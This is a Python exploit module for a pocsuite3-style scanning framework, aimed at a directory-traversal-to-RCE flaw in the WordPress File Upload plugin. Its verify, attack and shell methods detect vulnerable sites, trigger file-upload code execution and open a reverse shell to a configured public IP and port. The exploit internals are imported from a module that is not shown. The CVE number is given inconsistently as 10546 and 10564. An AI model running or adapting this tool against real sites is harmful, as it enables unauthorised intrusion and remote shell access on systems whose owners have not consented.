"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin

from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str

import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
import uuid
from urllib.parse import urlparse, urljoin
import binascii
from Framework.Library.Function.Function.PocSuite.Function import  decode_data_input_poc
from Framework.Library.Function.Function.PocSuite.init_pocs.cve_2020_10564 import file_upload_rce


class DemoPOC(POCBase):
    vulID = 'CVE-2020-10546'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '13/03/2020'
    createDate = '2020-11-15'
    updateDate = '2020-11-15'
    references = ['https://wpscan.com/vulnerability/10132']
    name = 'Wordpress File Upload < 4.13.0 - Directory traveral to RCE'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.PHP],
                "folder_init": "cve_2020_10564"}
    appName = 'wordpress-cve-2020-10564'
    appVersion = 'CVE-2020-10546'
    vulType = VUL_TYPE.DIRECTORY_LISTING
    desc = '''WordPress File Upload plugin directory traversal. It's possible to use the directory traversal to gain RCE by uploading a file inside the /lib directory of the plugin.'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSSv3: 9.8 (AV:N/AC:L/Au:N/C:P/I:P/A:P)'''
    url_result = {}

    
         

    def _verify(self, update=True):
        if update: 
            config_input, Referer = decode_data_input_poc(self.headers['Referer'])
            try: 
                self.url = config_input['Input']['RECON_WEBAPP']
            except Exception as e: 
                raise Exception("Error " + self.appName + " :" + str(e))
        result = {}
        result_url = []
        for url in self.url: 
            try: 
                if file_upload_rce.verify(url): 
                    result_url.append(url)
            except Exception as e: 
                pass
        if len(result_url) > 0: 
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = result_url
        if update: 
            return self.parse_output(result)
        else: 
            return result

        
           
    def _attack(self):
        config_input, Referer = decode_data_input_poc(self.headers['Referer'])
        try: 
            self.url = config_input["Input"]['RECON_WEBAPP']
            host_check_connect = config_input['Config']['Cf_Host_Check_Connect']
        except Exception as e: 
            raise Exception("Error " + self.appName + " :" + str(e) )
        result = {}
        vul_url = []
        self.url_check = ""
        if len(self._verify(update=False)) > 0: 
            for url in self.url: 
                try: 
                    check , url_check = file_upload_rce.attack(url, host_check_connect)
                    if check:
                        self.url_check = url_check 
                        vul_url.append(url)
                except Exception as e: 
                    pass
            if len(vul_url) > 0: 
                result['ShellInfo'] = {}
                result['ShellInfo']['url'] =  vul_url
                result["ShellInfo"]['url_check_vul'] = self.url_check
                result['ShellInfo']['info'] = '''wordpress file upload plugin RCE ''' 
                return self.parse_output(result)
            else: 
                return self.parse_output(False)
        else: 
            return self.parse_output(False)  


            
    def _shell(self):
        result = {}
        result['ShellInfo'] = {
                'Status': 'Success'
            }
        try:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['EXPLOIT_POCS']
                lhost_running = config_input['Config']['Cf_PublicIP']
                lport_running = config_input['Config']['Cf_PublicPort']
                
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
            self.url = self.url[0]['result']['ShellInfo']['url'][0]
            file_upload_rce.shell(self.url, lhost_running, lport_running)
            result["url"] = self.url
            result["info_reverse_shell"] = {
                "PublicIP": lhost_running,
                "PublicPort": lport_running

            }
            return self.parse_output(result)

        except Exception as e: 
            if type(e) == requests.exceptions.ReadTimeout: 
                return self.parse_output(result)
            print("Error run shell ", self.name, e)
            pass
        return self.parse_output(False)
        

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)
